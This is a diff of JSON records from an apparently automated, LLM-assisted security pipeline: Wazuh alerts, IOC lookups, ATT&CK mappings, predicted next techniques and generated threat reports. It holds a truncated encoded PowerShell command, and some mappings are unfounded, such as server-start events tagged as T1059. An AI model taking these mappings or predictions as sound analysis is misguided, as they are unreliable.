@@ -6612,5 +6612,2747 @@
     ],
     "errors": [],
     "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "version": 1,
+        "timestamp": "2026-06-20T10:15:00Z",
+        "rule": {
+          "level": 6,
+          "description": "PowerShell command execution",
+          "groups": [
+            "windows",
+            "powershell"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07"
+        },
+        "id": "15750000-0000-0000-0000-000000000001",
+        "full_log": "powershell.exe -enc JABzAD0AT..."
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-06-20T10:16:32Z",
+        "rule": {
+          "level": 9,
+          "description": "Possible C2 beacon detected",
+          "groups": [
+            "network",
+            "c2"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07"
+        },
+        "id": "15750000-0000-0000-0000-000000000002",
+        "full_log": "Outbound connection to 185.44.12.7"
+      },
+      {
+        "version": 1,
+        "timestamp": "2026-06-20T10:17:10Z",
+        "rule": {
+          "level": 9,
+          "description": "New scheduled task created",
+          "groups": [
+            "persistence",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WORKSTATION-07"
+        },
+        "id": "15750000-0000-0000-0000-000000000003",
+        "full_log": "Task created via schtasks.exe"
+      }
+    ],
+    "events": [
+      {
+        "event_id": "4ac42a29-e371-4a13-bf7d-f77eb0f25dcc",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-06-20T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 6,
+        "rule_description": "PowerShell command execution",
+        "rule_level": 6,
+        "rule_groups": [
+          "windows",
+          "powershell"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-06-20T10:15:00Z",
+          "rule": {
+            "level": 6,
+            "description": "PowerShell command execution",
+            "groups": [
+              "windows",
+              "powershell"
+            ]
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07"
+          },
+          "id": "15750000-0000-0000-0000-000000000001",
+          "full_log": "powershell.exe -enc JABzAD0AT..."
+        }
+      },
+      {
+        "event_id": "b6008acc-7043-4329-99af-900d46e8c0ae",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-06-20T10:16:32Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 9,
+        "rule_description": "Possible C2 beacon detected",
+        "rule_level": 9,
+        "rule_groups": [
+          "network",
+          "c2"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-06-20T10:16:32Z",
+          "rule": {
+            "level": 9,
+            "description": "Possible C2 beacon detected",
+            "groups": [
+              "network",
+              "c2"
+            ]
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07"
+          },
+          "id": "15750000-0000-0000-0000-000000000002",
+          "full_log": "Outbound connection to 185.44.12.7"
+        }
+      },
+      {
+        "event_id": "2bd26a27-26d1-4b33-b052-725cf3ff54ef",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-06-20T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 9,
+        "rule_description": "New scheduled task created",
+        "rule_level": 9,
+        "rule_groups": [
+          "persistence",
+          "windows"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "version": 1,
+          "timestamp": "2026-06-20T10:17:10Z",
+          "rule": {
+            "level": 9,
+            "description": "New scheduled task created",
+            "groups": [
+              "persistence",
+              "windows"
+            ]
+          },
+          "agent": {
+            "id": "001",
+            "name": "WORKSTATION-07"
+          },
+          "id": "15750000-0000-0000-0000-000000000003",
+          "full_log": "Task created via schtasks.exe"
+        }
+      }
+    ],
+    "iocs": [
+      {
+        "value": "185.44.12.7",
+        "ioc_type": "ip",
+        "reputation": "benign",
+        "confidence": 0.0,
+        "tags": [
+          "country:RU",
+          "data_center/web_hosting/transit",
+          "domain:atomdata.ru",
+          "isp:ATOMDATA JSC"
+        ],
+        "first_seen": null,
+        "last_seen": null,
+        "source": "AbuseIPDB",
+        "evidence": [
+          {
+            "provider": "AbuseIPDB",
+            "raw_response": {
+              "ipAddress": "185.44.12.7",
+              "isPublic": true,
+              "ipVersion": 4,
+              "isWhitelisted": false,
+              "abuseConfidenceScore": 0,
+              "countryCode": "RU",
+              "usageType": "Data Center/Web Hosting/Transit",
+              "isp": "ATOMDATA JSC",
+              "domain": "atomdata.ru",
+              "hostnames": [],
+              "isTor": false,
+              "countryName": "Russian Federation",
+              "totalReports": 0,
+              "numDistinctUsers": 0,
+              "lastReportedAt": null,
+              "reports": []
+            },
+            "queried_at": "2026-07-17 19:54:14.118061"
+          }
+        ],
+        "raw": {
+          "type": "ipv4",
+          "value": "185.44.12.7",
+          "source_event_id": "b6008acc-7043-4329-99af-900d46e8c0ae",
+          "confidence": 1.0
+        }
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.2,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "4ac42a29-e371-4a13-bf7d-f77eb0f25dcc",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.2,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "b6008acc-7043-4329-99af-900d46e8c0ae",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.3,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "2bd26a27-26d1-4b33-b052-725cf3ff54ef",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      }
+    ],
+    "campaign": {
+      "campaign_id": "e3b0c442-98fc-1c14-9a3e-5f9d2b1a4c3d",
+      "name": "Unclassified Activity",
+      "objective": "Unknown",
+      "timeline": [
+        {
+          "timestamp": "Unknown",
+          "event_id": "4ac42a29-e371-4a13-bf7d-f77eb0f25dcc",
+          "description": "A wazuh_alert was generated on host WORKSTATION-07 with no process, command line, or IP information, and is mapped to ATT&CK technique T1059 (Command and Scripting Interpreter)."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "b6008acc-7043-4329-99af-900d46e8c0ae",
+          "description": "A second wazuh_alert on WORKSTATION-07, also lacking process, command line, or IP details, is mapped to ATT&CK technique T1059 (Command and Scripting Interpreter)."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "2bd26a27-26d1-4b33-b052-725cf3ff54ef",
+          "description": "A third wazuh_alert on WORKSTATION-07, again with no process, command line, or IP data, is mapped to ATT&CK technique T1059 (Command and Scripting Interpreter)."
+        }
+      ],
+      "related_techniques": [
+        "T1059"
+      ],
+      "evidence_summary": "Three wazuh_alert events (IDs 4ac42a29-e371-4a13-bf7d-f77eb0f25dcc, b6008acc-7043-4329-99af-900d46e8c0ae, and 2bd26a27-26d1-4b33-b052-725cf3ff54ef) were recorded on host WORKSTATION-07. Each alert lacks process, command line, and IP information but is associated with ATT&CK technique T1059 (Command and Scripting Interpreter) per the provided mapping. No additional IOCs or network activity are present, and the single IP IOC (185.44.12.7) is marked benign with 0.0 confidence, offering no actionable evidence.",
+      "confidence": 0.2
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "rationale": "The alerts show repeated use of the generic Command and Scripting Interpreter technique (T1059). In typical Windows\u2011based campaigns, attackers immediately move to the most common sub\u2011techniques of T1059 to execute scripts or commands that download or install additional payloads. PowerShell (T1059.001) and the Windows Command Shell (T1059.003) are the most frequently used next steps, as they provide the means to run further malicious code, establish persistence, or perform credential dumping. Therefore, these two sub\u2011techniques are the most likely next actions in the attack chain."
+    },
+    "report": "# Threat Intelligence Report \u2013 Unclassified Activity on WORKSTATION\u201107  \n**Date:** 2026\u201107\u201117  \n**Prepared by:** Senior Threat Intelligence Analyst  \n\n---\n\n## Executive Summary  \nOn 20\u202fJune\u202f2026, **WORKSTATION\u201107** generated three high\u2011severity Wazuh alerts that collectively indicate a **Command & Scripting Interpreter (T1059)** activity. The alerts show:\n\n1. **PowerShell execution** (encoded command).  \n2. **Outbound connection** to IP **185.44.12.7** (Russia\u2011based data\u2011center).  \n3. **Creation of a scheduled task** (persistence mechanism).  \n\nThe single external IP is currently listed as *benign* in AbuseIPDB, but its association with the activity warrants further scrutiny. The campaign is presently *unclassified*; however, the pattern strongly suggests a staged attack that will likely progress to PowerShell (T1059.001) and Windows Command Shell (T1059.003) sub\u2011techniques.\n\n---\n\n## Timeline  \n\n| Time (UTC) | Event ID | Host | Alert Type | Key Details |\n|------------|----------|------|------------|-------------|\n| 10:15 | 4ac42a29 | WORKSTATION\u201107 | PowerShell execution | `powershell.exe -enc JABzAD0AT...` |\n| 10:16:32 | b6008acc | WORKSTATION\u201107 | C2 beacon | Outbound to **185.44.12.7** |\n| 10:17:10 | 2bd26a27 | WORKSTATION\u201107 | Persistence | New scheduled task via `schtasks.exe` |\n\n*All alerts were generated by the Wazuh agent (ID\u202f001).*\n\n---\n\n## IOCs  \n\n| Type | Value | Source | Confidence | Notes |\n|------|-------|--------|------------|-------|\n| IP | **185.44.12.7** | AbuseIPDB | 0.0 | Russia, data\u2011center, currently *benign* |\n| Host | WORKSTATION\u201107 | Internal | 1.0 | Target of all alerts |\n| Process | `powershell.exe` | Wazuh | 1.0 | Encoded command execution |\n| Scheduled Task | `schtasks.exe` | Wazuh | 1.0 | Persistence mechanism |\n\n> **Action:** Flag the IP for further investigation; consider blocking outbound traffic to 185.44.12.7 pending deeper analysis.\n\n---\n\n## ATT&CK Techniques  \n\n| Technique | Sub\u2011technique | Confidence | Evidence Event |\n|-----------|---------------|------------|----------------|\n| T1059 \u2013 Command & Scripting Interpreter | \u2013 | 0.2 | 4ac42a29, b6008acc, 2bd26a27 |\n| T1059.001 \u2013 PowerShell | \u2013 | 0.2 | 4ac42a29 |\n| T1059.003 \u2013 Windows Command Shell | \u2013 | 0.3 | 2bd26a27 |\n\n> **Mitigations** (per MITRE):  \n> \u2022 Limit software installation & enforce code signing.  \n> \u2022 Enable execution prevention & endpoint protection.  \n> \u2022 Audit scheduled tasks and PowerShell logs.  \n> \u2022 Restrict outbound traffic to known C2 IPs.\n\n---\n\n## Campaign Assessment  \n\n- **Campaign ID:** e3b0c442\u201198fc\u20111c14\u20119a3e\u20115f9d2b1a4c3d  \n- **Name:** Unclassified Activity  \n- **Objective:** Unknown (likely lateral movement or data exfiltration).  \n- **Current Confidence:** 0.2 (low) \u2013 due to limited actionable evidence.  \n- **Key Observations:**  \n  - Repeated use of T1059 indicates a scripted attack chain.  \n  - Scheduled task creation suggests persistence planning.  \n  - Outbound connection to a foreign IP raises suspicion despite benign reputation.\n\n---\n\n## Predicted Next Steps  \n\n| Likely Technique | Rationale |\n|------------------|-----------|\n| **T1059.001 \u2013 PowerShell** | Most common sub\u2011technique for Windows attacks; used to download/install payloads or perform credential dumping. |\n| **T1059.003 \u2013 Windows Command Shell** | Provides a fallback for executing commands when PowerShell is blocked or monitored. |\n\n> **Recommendation:** Prepare for these sub\u2011techniques by tightening PowerShell logging (module logging, script block logging) and monitoring for `cmd.exe` activity.\n\n---\n\n## Recommendations  \n\n1. **Immediate Network Controls**  \n   - Block outbound traffic from WORKSTATION\u201107 to **185.44.12.7** until a deeper investigation confirms malicious intent.  \n   - Deploy a network IDS rule to flag any future connections to this IP.\n\n2. **Endpoint Hardening**  \n   - Enable PowerShell module and script block logging.  \n   - Enforce execution policies that restrict unsigned scripts.  \n   - Audit scheduled tasks for unauthorized entries; consider disabling the `schtasks.exe` service if not required.\n\n3. **Threat Hunting**  \n   - Search for additional encoded PowerShell commands or `cmd.exe` usage on the network.  \n   - Look for other hosts with similar alert patterns (T1059, scheduled tasks).  \n   - Correlate with other logs (Sysmon, Windows Event Logs) for evidence of credential dumping or lateral movement.\n\n4. **IOC Management**  \n   - Add **185.44.12.7** to the internal threat database with a *suspicious* tag.  \n   - Monitor for any future reputation changes in AbuseIPDB or other threat feeds.\n\n5. **Reporting & Follow\u2011Up**  \n   - Document all findings and actions taken.  \n   - Schedule a review in 48\u202fhours to assess whether the predicted sub\u2011techniques have materialized.  \n   - If new malicious activity is detected, update the campaign profile and share with relevant stakeholders.\n\n---\n\n**Prepared by:**  \nSenior Threat Intelligence Analyst  \n[Signature]",
+    "actions_taken": [
+      {
+        "action": {
+          "action_type": "notify_analyst",
+          "target": "WORKSTATION-07",
+          "severity": "low",
+          "rationale": "Three wazuh alerts were generated on WORKSTATION-07, all mapped to ATT&CK technique T1059 (Command and Scripting Interpreter). However, the alerts lack process, command line, and IP details, and the only associated IP IOC (185.44.12.7) is marked benign with 0.0 confidence. The overall confidence of the mapping is 0.2, indicating weak evidence. No actionable indicators are present to warrant disruptive actions such as isolation or account disabling.",
+          "technique_id": "T1059",
+          "confidence": 0.2
+        },
+        "status": "pending_approval",
+        "detail": "Awaiting human approval (run actions/review_pending.py).",
+        "dry_run": true
+      }
+    ],
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "timestamp": "2026-07-18T08:06:36.757+0000",
+        "rule": {
+          "level": 3,
+          "description": "Wazuh server started.",
+          "id": "502",
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "ossec"
+          ],
+          "pci_dss": [
+            "10.6.1"
+          ],
+          "gpg13": [
+            "10.1"
+          ],
+          "gdpr": [
+            "IV_35.7.d"
+          ],
+          "hipaa": [
+            "164.312.b"
+          ],
+          "nist_800_53": [
+            "AU.6"
+          ],
+          "tsc": [
+            "CC7.2",
+            "CC7.3"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1784361996.0",
+        "full_log": "ossec: Manager started.",
+        "decoder": {
+          "name": "ossec"
+        },
+        "location": "wazuh-monitord"
+      },
+      {
+        "timestamp": "2026-07-18T11:33:08.667+0000",
+        "rule": {
+          "level": 3,
+          "description": "Wazuh server started.",
+          "id": "502",
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "ossec"
+          ],
+          "pci_dss": [
+            "10.6.1"
+          ],
+          "gpg13": [
+            "10.1"
+          ],
+          "gdpr": [
+            "IV_35.7.d"
+          ],
+          "hipaa": [
+            "164.312.b"
+          ],
+          "nist_800_53": [
+            "AU.6"
+          ],
+          "tsc": [
+            "CC7.2",
+            "CC7.3"
+          ]
+        },
+        "agent": {
+          "id": "000",
+          "name": "wazuh.manager"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1784374388.241",
+        "full_log": "ossec: Manager started.",
+        "decoder": {
+          "name": "ossec"
+        },
+        "location": "wazuh-monitord"
+      }
+    ],
+    "events": [
+      {
+        "event_id": "9cca9d9d-3727-432d-bdaa-3e36299beee3",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T08:06:36.757+0000",
+        "host": "wazuh.manager",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 3,
+        "rule_description": "Wazuh server started.",
+        "rule_level": 3,
+        "rule_groups": [
+          "ossec"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "timestamp": "2026-07-18T08:06:36.757+0000",
+          "rule": {
+            "level": 3,
+            "description": "Wazuh server started.",
+            "id": "502",
+            "firedtimes": 1,
+            "mail": false,
+            "groups": [
+              "ossec"
+            ],
+            "pci_dss": [
+              "10.6.1"
+            ],
+            "gpg13": [
+              "10.1"
+            ],
+            "gdpr": [
+              "IV_35.7.d"
+            ],
+            "hipaa": [
+              "164.312.b"
+            ],
+            "nist_800_53": [
+              "AU.6"
+            ],
+            "tsc": [
+              "CC7.2",
+              "CC7.3"
+            ]
+          },
+          "agent": {
+            "id": "000",
+            "name": "wazuh.manager"
+          },
+          "manager": {
+            "name": "wazuh.manager"
+          },
+          "id": "1784361996.0",
+          "full_log": "ossec: Manager started.",
+          "decoder": {
+            "name": "ossec"
+          },
+          "location": "wazuh-monitord"
+        }
+      },
+      {
+        "event_id": "30f9c03b-059c-4a59-a1cd-a2b7a3a24fe5",
+        "source": "wazuh",
+        "event_type": "wazuh_alert",
+        "timestamp": "2026-07-18T11:33:08.667+0000",
+        "host": "wazuh.manager",
+        "user": null,
+        "process": null,
+        "command_line": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "signature": null,
+        "category": null,
+        "severity": 3,
+        "rule_description": "Wazuh server started.",
+        "rule_level": 3,
+        "rule_groups": [
+          "ossec"
+        ],
+        "proto": null,
+        "service": null,
+        "query": null,
+        "raw": {
+          "timestamp": "2026-07-18T11:33:08.667+0000",
+          "rule": {
+            "level": 3,
+            "description": "Wazuh server started.",
+            "id": "502",
+            "firedtimes": 1,
+            "mail": false,
+            "groups": [
+              "ossec"
+            ],
+            "pci_dss": [
+              "10.6.1"
+            ],
+            "gpg13": [
+              "10.1"
+            ],
+            "gdpr": [
+              "IV_35.7.d"
+            ],
+            "hipaa": [
+              "164.312.b"
+            ],
+            "nist_800_53": [
+              "AU.6"
+            ],
+            "tsc": [
+              "CC7.2",
+              "CC7.3"
+            ]
+          },
+          "agent": {
+            "id": "000",
+            "name": "wazuh.manager"
+          },
+          "manager": {
+            "name": "wazuh.manager"
+          },
+          "id": "1784374388.241",
+          "full_log": "ossec: Manager started.",
+          "decoder": {
+            "name": "ossec"
+          },
+          "location": "wazuh-monitord"
+        }
+      }
+    ],
+    "iocs": [
+      {
+        "value": "wazuh.manager",
+        "ioc_type": "domain",
+        "reputation": "unknown",
+        "confidence": 0.0,
+        "tags": [],
+        "first_seen": null,
+        "last_seen": null,
+        "source": "",
+        "evidence": [],
+        "raw": {
+          "type": "domain",
+          "value": "wazuh.manager",
+          "source_event_id": "9cca9d9d-3727-432d-bdaa-3e36299beee3",
+          "confidence": 1.0
+        }
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.2,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "9cca9d9d-3727-432d-bdaa-3e36299beee3",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.2,
+        "attack_id": "T1059",
+        "technique_name": "Command and Scripting Interpreter",
+        "evidence_event_id": "30f9c03b-059c-4a59-a1cd-a2b7a3a24fe5",
+        "mapping_source": "llm",
+        "known_groups": [
+          "Fox Kitten",
+          "Stealth Falcon",
+          "Winter Vivern",
+          "FIN7",
+          "FIN6",
+          "FIN5",
+          "APT19",
+          "APT32",
+          "Dragonfly",
+          "Saint Bear",
+          "Whitefly",
+          "APT39",
+          "Ke3chang",
+          "APT37",
+          "Mustang Panda",
+          "Windigo",
+          "OilRig"
+        ],
+        "known_software": [
+          "DarkComet",
+          "StarProxy",
+          "CHOPSTICK",
+          "Donut",
+          "FIVEHANDS",
+          "Matryoshka",
+          "Imminent Monitor",
+          "Kessel",
+          "ZeroCleare",
+          "gh0st RAT",
+          "P.A.S. Webshell",
+          "WINERACK",
+          "SLIGHTPULSE",
+          "Bandook",
+          "VersaMem",
+          "Zeus Panda",
+          "NICECURL",
+          "SpeakUp",
+          "Get2",
+          "MuddyViper",
+          "Empire",
+          "Raspberry Robin",
+          "Bonadan"
+        ],
+        "recommended_mitigations": [
+          "Limit Software Installation",
+          "Code Signing",
+          "Disable or Remove Feature or Program",
+          "Execution Prevention",
+          "Antivirus/Antimalware",
+          "Privileged Account Management",
+          "Audit",
+          "Restrict Web-Based Content",
+          "Behavior Prevention on Endpoint"
+        ]
+      }
+    ],
+    "campaign": {
+      "campaign_id": "123e4567-e89b-12d3-a456-426614174000",
+      "name": "Unclassified Activity",
+      "objective": "Unknown",
+      "timeline": [
+        {
+          "timestamp": "Unknown",
+          "event_id": "9cca9d9d-3727-432d-bdaa-3e36299beee3",
+          "description": "A wazuh_alert was generated on host wazuh.manager with no additional process or network details. The event is mapped to ATT&CK technique T1059 (Command and Scripting Interpreter) with a confidence of 0.2."
+        },
+        {
+          "timestamp": "Unknown",
+          "event_id": "30f9c03b-059c-4a59-a1cd-a2b7a3a24fe5",
+          "description": "A second wazuh_alert was generated on host wazuh.manager with no additional process or network details. This event is also mapped to ATT&CK technique T1059 (Command and Scripting Interpreter) with a confidence of 0.2."
+        }
+      ],
+      "related_techniques": [
+        "T1059"
+      ],
+      "evidence_summary": "The evidence consists of two wazuh_alert events (IDs 9cca9d9d-3727-432d-bdaa-3e36299beee3 and 30f9c03b-059c-4a59-a1cd-a2b7a3a24fe5) both originating from the host wazuh.manager. Each event is associated with the ATT&CK technique T1059 (Command and Scripting Interpreter) with a confidence of 0.2, indicating potential use of command\u2011line or scripting capabilities. No additional process, command line, or network activity is recorded, and no other IOCs or techniques are present in the provided evidence.",
+      "confidence": 0.2
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1059.001 PowerShell",
+        "T1105 Remote File Copy",
+        "T1059.003 Windows Command Shell"
+      ],
+      "rationale": "The observed T1059 (Command and Scripting Interpreter) indicates the adversary is already executing commands or scripts. In typical ATT&CK attack chains, this early execution step is often followed by actions that leverage the same interpreter to download or execute additional payloads, establish persistence, or move laterally. Therefore, the most common next techniques are: 1) T1059.001 PowerShell \u2013 a popular scripting engine used for downloading, executing, and obfuscating code; 2) T1105 Remote File Copy \u2013 used to transfer malicious binaries or scripts from a remote source; and 3) T1059.003 Windows Command Shell \u2013 a fallback or secondary interpreter for executing system commands. These techniques represent the most likely progression from the current evidence."
+    },
+    "report": "# Threat Intelligence Report \u2013 Unclassified Activity on *wazuh.manager*\n\n| Item | Detail |\n|------|--------|\n| **Report ID** | 2026\u201107\u201118\u2011001 |\n| **Prepared by** | Senior Threat Intelligence Analyst |\n| **Date** | 18\u202fJuly\u202f2026 |\n| **Scope** | Events generated by the Wazuh manager host *wazuh.manager* |\n\n---\n\n## Executive Summary\nTwo Wazuh alerts were generated on the host **wazuh.manager** at 08:06:36\u202fUTC and 11:33:08\u202fUTC, both reporting \u201cWazuh server started.\u201d  The alerts were automatically mapped to ATT&CK technique **T1059 \u2013 Command and Scripting Interpreter** with a confidence of **0.2**.  No additional process, command\u2011line, or network activity was captured.  The evidence is therefore minimal and the mapping likely represents a false positive or an incomplete picture of adversary activity.  The campaign is currently classified as **Unclassified Activity** with an objective that remains unknown.\n\n---\n\n## Timeline\n\n| Timestamp (UTC) | Event ID | Host | Description |\n|-----------------|----------|------|-------------|\n| 2026\u201107\u201118\u202f08:06:36 | 9cca9d9d\u20113727\u2011432d\u2011bdaa\u20113e36299beee3 | wazuh.manager | Wazuh server started (alert ID\u202f502, severity\u202f3). |\n| 2026\u201107\u201118\u202f11:33:08 | 30f9c03b\u2011059c\u20114a59\u2011a1cd\u2011a2b7a3a24fe5 | wazuh.manager | Wazuh server started (alert ID\u202f502, severity\u202f3). |\n\n*Both events were automatically correlated to ATT&CK T1059 with low confidence.*\n\n---\n\n## IOCs\n\n| IOC | Type | Confidence | Source Event |\n|-----|------|------------|--------------|\n| wazuh.manager | Domain | 0.0 (unknown) | 9cca9d9d\u20113727\u2011432d\u2011bdaa\u20113e36299beee3 |\n\n*No additional IOCs (IP addresses, file hashes, etc.) were identified.*\n\n---\n\n## ATT&CK Techniques\n\n| Technique ID | Name | Confidence | Evidence |\n|--------------|------|------------|----------|\n| T1059 | Command and Scripting Interpreter | 0.2 | Both Wazuh alerts (server start) |\n| T1059.001 | PowerShell | 0.0 (predicted) | None |\n| T1105 | Remote File Copy | 0.0 (predicted) | None |\n| T1059.003 | Windows Command Shell | 0.0 (predicted) | None |\n\n*The mapping to T1059 is based on generic alert content and is not corroborated by process or command\u2011line data.*\n\n---\n\n## Campaign Assessment\n\n- **Campaign ID:** 123e4567\u2011e89b\u201112d3\u2011a456\u2011426614174000  \n- **Name:** Unclassified Activity  \n- **Objective:** Unknown  \n- **Evidence Summary:** Two Wazuh alerts with no process or network details.  \n- **Confidence:** 0.2 (low)  \n\nThe campaign is currently **unclassified** due to insufficient evidence.  The lack of actionable artifacts (e.g., payloads, command strings, IP addresses) limits the ability to attribute or assess intent.\n\n---\n\n## Predicted Next Steps\n\nBased on the observed T1059 activity and typical ATT&CK progression, the following techniques are the most likely next actions:\n\n1. **T1059.001 \u2013 PowerShell**  \n   